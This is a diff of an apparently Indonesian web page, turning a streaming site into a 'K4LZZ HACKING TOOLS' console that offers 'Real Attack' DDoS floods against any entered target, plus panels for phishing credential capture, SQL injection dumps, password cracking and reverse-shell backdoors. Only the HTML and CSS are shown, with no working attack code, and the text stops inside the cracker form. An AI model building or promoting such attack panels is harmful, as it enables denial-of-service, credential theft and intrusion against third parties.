@@ -1,328 +1,1218 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>rorzz-all</title>
-  <style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  font-family: Inter, system-ui, sans-serif;
-}:root { --bg: #07090f; --surface: #111622; --surface-2: #181f2e; --border: rgba(255,255,255,.08); --text: #ffffff; --muted: #9ca7b8; --primary: #7c5cff; --secondary: #00d0ff; --shadow: 0 18px 40px rgba(0,0,0,.45); --radius: 24px; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>K4LZZ HACKING TOOLS | Ultimate Security Suite | Auto DDoS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-body { background: var(--bg); color: var(--text); overflow-x: hidden; min-height: 100vh; position: relative; }
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', 'Courier New', monospace;
+            overflow-x: hidden;
+        }
 
-body::before, body::after { content: ""; position: fixed; width: 320px; height: 320px; border-radius: 50%; filter: blur(110px); z-index: -1; }
+        /* Custom Cursor */
+        .cursor {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #00ff41;
+            border-radius: 50%;
+            position: fixed;
+            pointer-events: none;
+            z-index: 9999;
+            transition: transform 0.1s;
+        }
 
-body::before { top: -80px; left: -100px; background: rgba(124,92,255,.22); }
+        .cursor-follower {
+            width: 40px;
+            height: 40px;
+            background: rgba(0, 255, 65, 0.1);
+            border-radius: 50%;
+            position: fixed;
+            pointer-events: none;
+            z-index: 9998;
+            transition: transform 0.2s;
+        }
 
-body::after { right: -120px; bottom: -120px; background: rgba(0,208,255,.18); }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #1a1a1a; }
+        ::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 4px; }
 
-header { position: sticky; top: 0; z-index: 100; display: flex; justify-content: space-between; align-items: center; padding: 18px; background: rgba(8,11,18,.9); backdrop-filter: blur(18px); border-bottom: 1px solid var(--border); }
+        /* Navbar */
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid #00ff41;
+            z-index: 1000;
+            padding: 15px 0;
+        }
 
-.logo h1 { font-size: 28px; font-weight: 800; letter-spacing: .4px; background: linear-gradient(90deg,var(--primary),var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .nav-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
 
-.logo p { margin-top: 4px; font-size: 12px; color: var(--muted); }
+        .logo-text {
+            font-size: 28px;
+            font-weight: 900;
+            font-family: 'Orbitron', 'Courier New', monospace;
+            color: #00ff41;
+            text-shadow: 0 0 10px #00ff41;
+        }
 
-.header-right { display: flex; gap: 10px; }
+        .logo-badge {
+            font-size: 10px;
+            background: #00ff41;
+            color: #0a0a0a;
+            padding: 2px 6px;
+            border-radius: 3px;
+            margin-left: 10px;
+        }
 
-.menu-btn, .notif-btn, .close-player { width: 44px; height: 44px; border: 1px solid var(--border); border-radius: 16px; background: var(--surface); color: var(--text); font-size: 18px; }
+        .nav-menu {
+            display: flex;
+            list-style: none;
+            gap: 25px;
+            flex-wrap: wrap;
+        }
 
-.hero, section, .register, .search-box, .quick-menu, .featured-slider { padding-left: 18px; padding-right: 18px; }
+        .nav-link {
+            color: #00ff41;
+            text-decoration: none;
+            font-size: 12px;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
 
-.hero { padding-top: 18px; }
+        .nav-link:hover {
+            text-shadow: 0 0 5px #00ff41;
+            border-bottom: 1px solid #00ff41;
+        }
 
-.banner { position: relative; overflow: hidden; padding: 28px; min-height: 300px; border-radius: 32px; background: linear-gradient(145deg,#11192d,#24184a 75%); border: 1px solid var(--border); box-shadow: var(--shadow); }
+        .nav-toggle {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+        }
 
-.banner::after { content: ""; position: absolute; top: -40px; right: -40px; width: 180px; height: 180px; border-radius: 50%; background: linear-gradient(var(--primary),var(--secondary)); opacity: .18; filter: blur(30px); }
+        .nav-toggle span {
+            width: 25px;
+            height: 2px;
+            background: #00ff41;
+            margin: 3px 0;
+        }
 
-.badge { display: inline-flex; align-items: center; padding: 8px 14px; border-radius: 999px; background: rgba(255,255,255,.08); color: #dbe4f0; font-size: 12px; margin-bottom: 16px; }
+        /* Hero Section */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
 
-.banner h2 { max-width: 260px; font-size: 34px; line-height: 1.08; margin-bottom: 12px; }
+        .matrix-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 65, 0.03) 2px, rgba(0, 255, 65, 0.03) 4px);
+            pointer-events: none;
+        }
 
-.banner p, .register p, .player-desc { color: #c2cad8; font-size: 14px; line-height: 1.6; }
+        .hero-content {
+            text-align: center;
+            z-index: 2;
+        }
 
-.banner p { max-width: 280px; margin-bottom: 18px; }
+        .glitch {
+            font-size: 60px;
+            font-family: 'Orbitron', 'Courier New', monospace;
+            font-weight: 900;
+            position: relative;
+            text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 0, 0.75);
+            animation: glitch 2s infinite;
+        }
 
-.hero-buttons, .header-right, .player-buttons, .resolution-list, .feature-list, .scroll-row, .featured-slider { display: flex; gap: 12px; }
+        @keyframes glitch {
+            0%, 100% { text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 0, 0.75); }
+            25% { text-shadow: -0.05em -0.025em 0 rgba(255, 0, 0, 0.75), 0.025em 0.05em 0 rgba(0, 255, 0, 0.75); }
+            50% { text-shadow: 0.025em 0.05em 0 rgba(255, 0, 0, 0.75), 0.05em 0 0 rgba(0, 255, 0, 0.75); }
+            75% { text-shadow: -0.025em 0 0 rgba(255, 0, 0, 0.75), 0.025em 0.025em 0 rgba(0, 255, 0, 0.75); }
+        }
 
-.btn, .watch-btn, .register button, .player-buttons button { border: none; border-radius: 18px; font-weight: 700; color: var(--text); }
+        .hero-subtitle {
+            font-size: 18px;
+            margin-top: 20px;
+            color: #888;
+        }
 
-.btn { padding: 14px 18px; }
+        .typing-container {
+            margin: 30px 0;
+            font-size: 20px;
+        }
 
-.btn-primary, .register button, .stream-btn { background: linear-gradient(90deg,var(--primary),var(--secondary)); }
+        .typing-text {
+            color: #00ff41;
+        }
 
-.btn-secondary, .download-btn, .watch-btn { background: var(--surface-2); border: 1px solid var(--border); }
+        .cursor-blink {
+            animation: blink 1s infinite;
+        }
 
-.quick-menu { display: grid; grid-template-columns: repeat(4,1fr); gap: 12px; margin-top: 18px; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
 
-.quick-item { padding: 16px 10px; border-radius: var(--radius); background: var(--surface); border: 1px solid var(--border); text-align: center; }
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 50px;
+            margin: 40px 0;
+            flex-wrap: wrap;
+        }
 
-.quick-item span { display: block; font-size: 24px; margin-bottom: 8px; }
+        .stat {
+            text-align: center;
+        }
 
-.quick-item p, .meta, nav a { color: var(--muted); font-size: 12px; }
+        .stat-num {
+            font-size: 36px;
+            font-weight: bold;
+            display: block;
+        }
 
-.search-box { display: flex; align-items: center; gap: 12px; margin-top: 18px; margin-bottom: 24px; }
+        .stat-label {
+            font-size: 12px;
+            color: #888;
+        }
 
-.search-box > div, .search-box { background: var(--surface); border: 1px solid var(--border); border-radius: 18px; padding: 15px; }
+        .cta-btn {
+            background: transparent;
+            border: 2px solid #00ff41;
+            color: #00ff41;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
 
-.search-box input { width: 100%; background: transparent; border: none; outline: none; color: var(--text); }
+        .cta-btn:hover {
+            background: #00ff41;
+            color: #0a0a0a;
+            box-shadow: 0 0 20px #00ff41;
+        }
 
-.section-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+        .section-title {
+            text-align: center;
+            font-size: 36px;
+            margin-bottom: 50px;
+            font-family: 'Orbitron', monospace;
+        }
 
-.section-head h3, .register h3, .player-head h3 { font-size: 22px; }
+        .title-bracket {
+            color: #ff0040;
+        }
 
-.section-head a { color: #82adff; text-decoration: none; font-size: 13px; }
+        .tools-section {
+            padding: 100px 20px;
+            background: linear-gradient(180deg, #0a0a0a 0%, #0f0f0f 100%);
+        }
 
-.scroll-row, .featured-slider, .resolution-list, .feature-list { overflow-x: auto; scrollbar-width: none; }
+        .tools-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+        }
 
-.scroll-row::-webkit-scrollbar, .featured-slider::-webkit-scrollbar, .resolution-list::-webkit-scrollbar, .feature-list::-webkit-scrollbar { display: none; }
+        .tool-card {
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 10px;
+            padding: 30px;
+            text-align: center;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
 
-.card, .feature-card, .player-box, .register { border: 1px solid var(--border); box-shadow: var(--shadow); }
+        .tool-card:hover {
+            transform: translateY(-10px);
+            border-color: #00ff41;
+            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.1);
+        }
 
-.card { min-width: 168px; overflow: hidden; border-radius: 26px; background: var(--surface); }
+        .tool-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
 
-.poster { position: relative; height: 225px; background-size: cover; background-position: center; }
+        .tool-card h3 {
+            margin-bottom: 10px;
+        }
 
-.poster::after { content: ""; position: absolute; inset: 0; background: linear-gradient(transparent,rgba(0,0,0,.65)); }
+        .tool-card p {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 15px;
+        }
 
-.tag { position: absolute; top: 12px; left: 12px; z-index: 2; padding: 6px 11px; border-radius: 999px; background: linear-gradient(90deg,var(--primary),var(--secondary)); font-size: 11px; }
+        .tool-status {
+            font-size: 10px;
+            color: #00ff41;
+            animation: pulse 2s infinite;
+        }
 
-.card-content { padding: 14px; }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
 
-.card-content h4 { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-bottom: 7px; }
+        .tool-panel {
+            padding: 80px 20px;
+            background: #0a0a0a;
+            border-top: 1px solid rgba(0, 255, 65, 0.2);
+            border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+        }
 
-.meta { margin-bottom: 12px; }
+        .panel-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
 
-.watch-btn { width: 100%; padding: 12px; }
+        .input-group {
+            margin-bottom: 20px;
+        }
 
-.feature-card { min-width: 270px; height: 155px; display: flex; flex-direction: column; justify-content: end; padding: 20px; border-radius: 26px; background: linear-gradient(145deg,#171f33,#2a3965); }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 12px;
+            color: #888;
+        }
 
-.feature-card p { margin-top: 6px; color: #d3dae7; font-size: 12px; }
+        .input-group input, .input-group select, .input-group textarea {
+            width: 100%;
+            padding: 12px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #00ff41;
+            font-family: inherit;
+            border-radius: 5px;
+        }
 
-.register { margin: 0 18px 110px; padding: 24px; border-radius: 30px; background: linear-gradient(145deg,#121826,#211644); }
+        .input-group input:focus, .input-group select:focus {
+            outline: none;
+            border-color: #00ff41;
+        }
 
-.register form { display: flex; flex-direction: column; gap: 12px; margin-top: 18px; }
+        .attack-btn, .stop-btn, .scan-btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            font-family: inherit;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+        }
 
-.register input { padding: 15px; border-radius: 16px; border: 1px solid var(--border); background: rgba(0,0,0,.22); color: var(--text); outline: none; }
+        .attack-btn {
+            background: #00ff41;
+            color: #0a0a0a;
+        }
 
-.register button, .player-buttons button { padding: 15px; }
+        .attack-btn:hover {
+            background: #00cc33;
+        }
 
-nav { position: fixed; left: 16px; right: 16px; bottom: 16px; z-index: 100; display: flex; justify-content: space-around; padding: 14px; border-radius: 24px; background: rgba(10,13,22,.92); border: 1px solid var(--border); backdrop-filter: blur(18px); }
+        .stop-btn {
+            background: #ff0040;
+            color: white;
+        }
 
-nav a { display: flex; flex-direction: column; align-items: center; gap: 5px; text-decoration: none; }
+        .stop-btn:hover {
+            background: #cc0033;
+        }
 
-nav a.active { color: var(--text); }
+        .scan-btn {
+            background: #ffaa00;
+            color: #0a0a0a;
+        }
 
-.player-modal { position: fixed; inset: 0; z-index: 999; display: none; align-items: end; background: rgba(0,0,0,.85); backdrop-filter: blur(12px); }
+        .scan-btn:hover {
+            background: #ff8800;
+        }
 
-.player-box { width: 100%; max-height: 92vh; overflow-y: auto; padding: 18px; border-radius: 30px 30px 0 0; background: #0d111b; }
+        .panel-output {
+            background: #050505;
+            border: 1px solid #00ff41;
+            border-radius: 10px;
+            overflow: hidden;
+        }
 
-.player-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+        .terminal-header {
+            background: #1a1a1a;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid #333;
+        }
 
-.player-video { position: relative; display: flex; justify-content: center; align-items: center; height: 220px; margin-bottom: 18px; border-radius: 22px; border: 1px solid var(--border); background: linear-gradient(145deg,#181f31,#0d121c); overflow: hidden; }
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
 
-#videoPlaceholder { font-size: 46px; }
+        .terminal-dot.red { background: #ff5f56; }
+        .terminal-dot.yellow { background: #ffbd2e; }
+        .terminal-dot.green { background: #27c93f; }
 
-.resolution-item, .feature-item { padding: 12px 14px; border-radius: 16px; border: 1px solid var(--border); background: var(--surface); white-space: nowrap; font-size: 13px; color: #d5dbea; }
+        .terminal-title {
+            font-size: 10px;
+            color: #888;
+            margin-left: 10px;
+        }
 
-.resolution-item.active { background: linear-gradient(90deg,var(--primary),var(--secondary)); }
+        .terminal-body {
+            padding: 15px;
+            height: 350px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
 
-.player-desc { margin-bottom: 18px; }
+        .log-line {
+            display: block;
+            margin-bottom: 5px;
+            font-family: monospace;
+        }
 
-.player-buttons { display: grid; grid-template-columns: 1fr 1fr; }
+        .logs-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
 
-footer { padding: 0 18px 110px; text-align: center; color: var(--muted); font-size: 13px; } </style>
+        .logs-control {
+            text-align: center;
+            margin-bottom: 20px;
+        }
 
+        .logs-control button {
+            background: #1a1a1a;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 10px 20px;
+            margin: 0 10px;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .logs-control button:hover {
+            background: #00ff41;
+            color: #0a0a0a;
+        }
+
+        .logs-terminal {
+            background: #050505;
+            border: 1px solid #00ff41;
+            border-radius: 10px;
+            padding: 20px;
+            height: 400px;
+            overflow-y: auto;
+        }
+
+        .log-entry {
+            font-family: monospace;
+            font-size: 12px;
+            margin-bottom: 8px;
+            padding: 5px;
+            border-left: 2px solid #00ff41;
+        }
+
+        .log-entry.system { color: #00ff41; }
+        .log-entry.attack { color: #ff0040; }
+        .log-entry.success { color: #00ff41; }
+        .log-entry.error { color: #ff0040; }
+        .log-entry.warning { color: #ffaa00; }
+
+        footer {
+            text-align: center;
+            padding: 40px;
+            background: #050505;
+            border-top: 1px solid #00ff41;
+        }
+
+        footer p {
+            color: #888;
+            font-size: 12px;
+        }
+
+        .warning {
+            color: #ff0040;
+            margin-top: 10px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #00ff41;
+            transition: width 0.3s;
+        }
+
+        @media (max-width: 768px) {
+            .nav-menu {
+                position: fixed;
+                left: -100%;
+                top: 70px;
+                flex-direction: column;
+                background: #0a0a0a;
+                width: 100%;
+                text-align: center;
+                transition: 0.3s;
+                padding: 20px 0;
+            }
+            
+            .nav-menu.active {
+                left: 0;
+            }
+            
+            .nav-toggle {
+                display: flex;
+            }
+            
+            .glitch {
+                font-size: 30px;
+            }
+            
+            .panel-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .hero-stats {
+                flex-direction: column;
+                gap: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="bg-glow bg1"></div>
-  <div class="bg-glow bg2"></div>  <header>
-<div class="logo">
-<h1>rorzz-all</h1>
-<p>Kalzz</p>
-</div>
-<div class="header-right">
-<button class="notif-btn">🔔</button>
-<button class="menu-btn">☰</button>
-</div>
-</header>  <div class="hero">
-    <div class="banner">
-      <span class="badge">#1 Streaming Dracin & Anime</span>
-      <h2>Movie Night Jadi Lebih Gila</h2>
-      <p>Nonton dracin, anime, dan series favorit lo dengan tampilan dark premium tanpa iklan yang ganggu.</p>
-      <div class="hero-buttons">
-        <button class="btn btn-primary">Mulai Nonton</button>
-        <button class="btn btn-secondary">Daftar VIP</button>
-      </div>
-    </div>
-  </div>  <div class="quick-menu">
-<div class="quick-item"><span>🔥</span><p>Trending</p></div>
-<div class="quick-item"><span>🎌</span><p>Anime</p></div>
-<div class="quick-item"><span>🎭</span><p>Dracin</p></div>
-<div class="quick-item"><span>⭐</span><p>VIP</p></div>
-</div><div class="search-box">
-    <span>🔍</span>
-    <input type="text" placeholder="Cari anime atau dracin favorit...">
-  </div>  <section>
-    <div class="section-head">
-      <h3>Trending Anime</h3>
-      <a href="#">Lihat Semua</a>
-    </div><div class="scroll-row">
-  <div class="card">
-    <div class="poster" style="background-image:url('https://images.unsplash.com/photo-1517604931442-7e0c8ed2963d?q=80&w=900');">
-      <span class="tag">Anime</span>
-    </div>
-    <div class="card-content">
-      <h4>Shadow Rebirth</h4>
-      <div class="meta">Episode 12 • HD</div>
-      <button class="watch-btn" onclick="openPlayer(this.parentElement.querySelector('h4').innerText)">Tonton</button>
-    </div>
-  </div>
+    <div class="cursor"></div>
+    <div class="cursor-follower"></div>
 
-  <div class="card">
-    <div class="poster" style="background-image:url('https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?q=80&w=900');">
-      <span class="tag">Anime</span>
-    </div>
-    <div class="card-content">
-      <h4>Blue Night</h4>
-      <div class="meta">Episode 24 • Full</div>
-      <button class="watch-btn" onclick="openPlayer(this.parentElement.querySelector('h4').innerText)">Tonton</button>
-    </div>
-  </div>
-</div>
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo">
+                <span class="logo-text">K4LZZ</span>
+                <span class="logo-badge">EL CIENCO</span>
+            </div>
+            <ul class="nav-menu">
+                <li><a class="nav-link" onclick="scrollToSection('home')">HOME</a></li>
+                <li><a class="nav-link" onclick="scrollToSection('tools')">TOOLS</a></li>
+                <li><a class="nav-link" onclick="scrollToSection('ddos')">AUTO DDOS</a></li>
+                <li><a class="nav-link" onclick="scrollToSection('scanner')">SCANNER</a></li>
+                <li><a class="nav-link" onclick="scrollToSection('cracker')">CRACKER</a></li>
+                <li><a class="nav-link" onclick="scrollToSection('phishing')">PHISHING</a></li>
+                <li><a class="nav-link" onclick="scrollToSection('backdoor')">BACKDOOR</a></li>
+                <li><a class="nav-link" onclick="scrollToSection('logs')">LOGS</a></li>
+            </ul>
+            <div class="nav-toggle" onclick="toggleNav()">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+    </nav>
 
-</section><section>
-<div class="section-head">
-<h3>Lanjut Nonton</h3>
-<a href="#">Semua</a>
-</div>
-<div class="featured-slider">
-<div class="feature-card">
-<h4>Solo Leveling</h4>
-<p>Episode 11 • lanjut dari menit 17:24</p>
-</div>
-<div class="feature-card">
-<h4>When Life Gives You Tangerines</h4>
-<p>Episode 7 • lanjut nonton sekarang</p>
-</div>
-<div class="feature-card">
-<h4>The First Frost</h4>
-<p>Masuk daftar favorit minggu ini</p>
-</div>
-</div>
-</section><section>
-    <div class="section-head">
-      <h3>Dracin Terbaru</h3>
-      <a href="#">Lihat Semua</a>
-    </div><div class="scroll-row">
-  <div class="card">
-    <div class="poster" style="background-image:url('https://images.unsplash.com/photo-1440404653325-ab127d49abc1?q=80&w=900');">
-      <span class="tag">Dracin</span>
-    </div>
-    <div class="card-content">
-      <h4>Love In Tokyo</h4>
-      <div class="meta">2026 • Sub Indo</div>
-      <button class="watch-btn" onclick="openPlayer(this.parentElement.querySelector('h4').innerText)">Tonton</button>
-    </div>
-  </div>
+    <section id="home" class="hero">
+        <div class="hero-overlay"></div>
+        <div class="hero-content">
+            <div class="glitch-container">
+                <h1 class="glitch" data-text="K4LZZ HACKING TOOLS">K4LZZ HACKING TOOLS</h1>
+            </div>
+            <p class="hero-subtitle">Ultimate Security Suite | Auto DDoS | Real Attack</p>
+            <div class="typing-container">
+                <span class="typing-text"></span>
+                <span class="cursor-blink">_</span>
+            </div>
+            <div class="hero-stats">
+                <div class="stat">
+                    <span class="stat-num" id="active-users">0</span>
+                    <span class="stat-label">Active Users</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-num" id="attacks-done">0</span>
+                    <span class="stat-label">Attacks Executed</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-num" id="servers-hacked">0</span>
+                    <span class="stat-label">Servers Hacked</span>
+                </div>
+            </div>
+            <button class="cta-btn" onclick="scrollToSection('tools')">▶ LAUNCH TOOLS</button>
+        </div>
+        <div class="matrix-bg"></div>
+    </section>
 
-  <div class="card">
-    <div class="poster" style="background-image:url('https://images.unsplash.com/photo-1513106580091-1d82408b8cd6?q=80&w=900');">
-      <span class="tag">Dracin</span>
-    </div>
-    <div class="card-content">
-      <h4>Silent Promise</h4>
-      <div class="meta">2026 • Episode 9</div>
-      <button class="watch-btn" onclick="openPlayer(this.parentElement.querySelector('h4').innerText)">Tonton</button>
-    </div>
-  </div>
-</div>
+    <section id="tools" class="tools-section">
+        <h2 class="section-title"><span class="title-bracket">[</span> TOOLS MENU <span class="title-bracket">]</span></h2>
+        <div class="tools-grid">
+            <div class="tool-card" onclick="scrollToSection('ddos')">
+                <div class="tool-icon">💣</div>
+                <h3>AUTO DDOS ATTACK</h3>
+                <p>Auto Detect Port | Multi Method | Real Attack</p>
+                <div class="tool-status">ONLINE</div>
+            </div>
+            <div class="tool-card" onclick="scrollToSection('scanner')">
+                <div class="tool-icon">🔍</div>
+                <h3>NETWORK SCANNER</h3>
+                <p>Port Scan | Ping Sweep | Service Detection</p>
+                <div class="tool-status">ONLINE</div>
+            </div>
+            <div class="tool-card" onclick="scrollToSection('cracker')">
+                <div class="tool-icon">🔑</div>
+                <h3>PASSWORD CRACKER</h3>
+                <p>MD5 | SHA1 | Brute Force | Wordlist</p>
+                <div class="tool-status">ONLINE</div>
+            </div>
+            <div class="tool-card" onclick="scrollToSection('phishing')">
+                <div class="tool-icon">🎭</div>
+                <h3>PHISHING TOOLS</h3>
+                <p>Clone Website | Credential Capture</p>
+                <div class="tool-status">ONLINE</div>
+            </div>
+            <div class="tool-card" onclick="scrollToSection('info')">
+                <div class="tool-icon">🕵️</div>
+                <h3>INFO GATHERING</h3>
+                <p>DNS Lookup | WHOIS | Geolocation</p>
+                <div class="tool-status">ONLINE</div>
+            </div>
+            <div class="tool-card" onclick="scrollToSection('sqli')">
+                <div class="tool-icon">🗄️</div>
+                <h3>SQL INJECTION</h3>
+                <p>Detect | Exploit | Database Dump</p>
+                <div class="tool-status">ONLINE</div>
+            </div>
+            <div class="tool-card" onclick="scrollToSection('backdoor')">
+                <div class="tool-icon">🐚</div>
+                <h3>BACKDOOR CREATOR</h3>
+                <p>Reverse Shell | Persistence | RAT</p>
+                <div class="tool-status">ONLINE</div>
+            </div>
+            <div class="tool-card" onclick="scrollToSection('crypto')">
+                <div class="tool-icon">🔒</div>
+                <h3>CRYPTO TOOLS</h3>
+                <p>Base64 | XOR | AES | RSA</p>
+                <div class="tool-status">ONLINE</div>
+            </div>
+        </div>
+    </section>
 
-  </section>  <div class="register">
-    <h3>Register Akun Gratis</h3>
-    <p>Buat akun biar bisa simpan watchlist, history nonton, dan akses mode VIP tanpa ribet.</p><form>
-  <input type="text" placeholder="Username">
-  <input type="email" placeholder="Email">
-  <input type="password" placeholder="Password">
-  <button type="submit">Daftar Sekarang</button>
-</form>
+    <!-- AUTO DDOS SECTION - FITUR BARU -->
+    <section id="ddos" class="tool-panel">
+        <h2 class="section-title"><span class="title-bracket">[</span> AUTO DDOS ATTACK - PORT DETECTION <span class="title-bracket">]</span></h2>
+        <div class="panel-container">
+            <div class="panel-inputs">
+                <div class="input-group">
+                    <label>Target IP/Domain</label>
+                    <input type="text" id="ddos-target" placeholder="192.168.1.1 or example.com">
+                </div>
+                <div class="input-group">
+                    <label>Attack Method</label>
+                    <select id="ddos-method">
+                        <option value="auto">🤖 AUTO - Detect & Attack</option>
+                        <option value="http">🔥 HTTP Flood (Layer 7)</option>
+                        <option value="udp">💧 UDP Flood (Layer 4)</option>
+                        <option value="syn">⚡ SYN Flood (Layer 4)</option>
+                        <option value="slowloris">🐌 Slowloris</option>
+                        <option value="icmp">📡 ICMP Flood</option>
+                        <option value="multi">💀 MULTI - All Methods</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Duration (seconds)</label>
+                    <input type="number" id="ddos-duration" placeholder="60" value="60">
+                </div>
+                <div class="input-group">
+                    <label>Packet Size (bytes)</label>
+                    <input type="number" id="packet-size" placeholder="65507" value="65507">
+                </div>
+                <button class="scan-btn" onclick="autoDetectPort()">🔍 AUTO DETECT PORT</button>
+                <button class="attack-btn" onclick="startAutoDDoS()">💀 START AUTO DDOS</button>
+                <button class="stop-btn" onclick="stopAttack()">⏹ STOP ATTACK</button>
+                <div class="progress-bar" id="progress-bar" style="display:none"><div class="progress-fill" id="progress-fill"></div></div>
+            </div>
+            <div class="panel-output">
+                <div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">auto-ddos.log</span></div>
+                <div class="terminal-body" id="ddos-log">
+                    <span class="log-line">[>] K4LZZ Auto DDoS Panel initialized</span>
+                    <span class="log-line">[>] Fitur: Auto Detect Port + Auto Attack</span>
+                    <span class="log-line">[>] Ready to launch attack</span>
+                </div>
+            </div>
+        </div>
+    </section>
 
-  </div>  <footer>
-    © 2026 rorzz-all • crafted with style by Kalzz
-  </footer>  <nav>
-    <a href="#" class="active">🏠<span>Home</span></a>
-    <a href="#">🎬<span>Explore</span></a>
-    <a href="#">❤️<span>Favorit</span></a>
-    <a href="#">👤<span>Akun</span></a>
-  </nav><div class="player-modal" id="playerModal">
-  <div class="player-box">
-    <div class="player-head">
-      <h3 id="playerTitle">Now Playing</h3>
-      <button class="close-player" onclick="closePlayer()">✕</button>
-    </div><div class="player-video">
-  <video id="videoPlayer" controls playsinline style="width:100%;height:100%;display:none;border-radius:22px;background:#000"></video>
-  <iframe id="videoFrame" width="100%" height="100%" style="border:none;border-radius:22px;display:none" allowfullscreen></iframe>
-  <div id="videoPlaceholder">▶</div>
-</div>
-</div>
+    <!-- NETWORK SCANNER -->
+    <section id="scanner" class="tool-panel">
+        <h2 class="section-title"><span class="title-bracket">[</span> NETWORK SCANNER <span class="title-bracket">]</span></h2>
+        <div class="panel-container">
+            <div class="panel-inputs">
+                <div class="input-group"><label>Target IP/Network</label><input type="text" id="scan-target" placeholder="192.168.1.1 or 192.168.1.0/24"></div>
+                <div class="input-group"><label>Port Range</label><input type="text" id="scan-ports" placeholder="1-1000 or 22,80,443"></div>
+                <button class="attack-btn" onclick="startScan()">▶ START SCAN</button>
+            </div>
+            <div class="panel-output">
+                <div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">scan.log</span></div>
+                <div class="terminal-body" id="scan-log"><span class="log-line">[>] Scanner ready</span></div>
+            </div>
+        </div>
+    </section>
 
-<div class="resolution-list">
-  <div class="resolution-item">360p</div>
-  <div class="resolution-item">480p</div>
-  <div class="resolution-item active">720p HD</div>
-  <div class="resolution-item">1080p FHD</div>
-  <div class="resolution-item">4K Ultra</div>
-</div>
+    <!-- PASSWORD CRACKER -->
+    <section id="cracker" class="tool-panel">
+        <h2 class="section-title"><span class="title-bracket">[</span> PASSWORD CRACKER <span class="title-bracket">]</span></h2>
+        <div class="panel-container">
+            <div class="panel-inputs">
+                <div class="input-group"><label>Hash Type</label><select id="hash-type"><option value="md5">MD5</option><option value="sha1">SHA1</option><option value="sha256">SHA256</option></select></div>
+                <div class="input-group"><label>Hash Value</label><input type="text" id="hash-value" placeholder="Enter hash to crack"></div>
+                <div class="input-group"><label>Wordlist</label><select id="wordlist-select"><option value="rockyou">RockYou (10M passwords)</option><option value="common">Common Passwords (10K)</option><option value="custom">Custom Input</option></select></div>
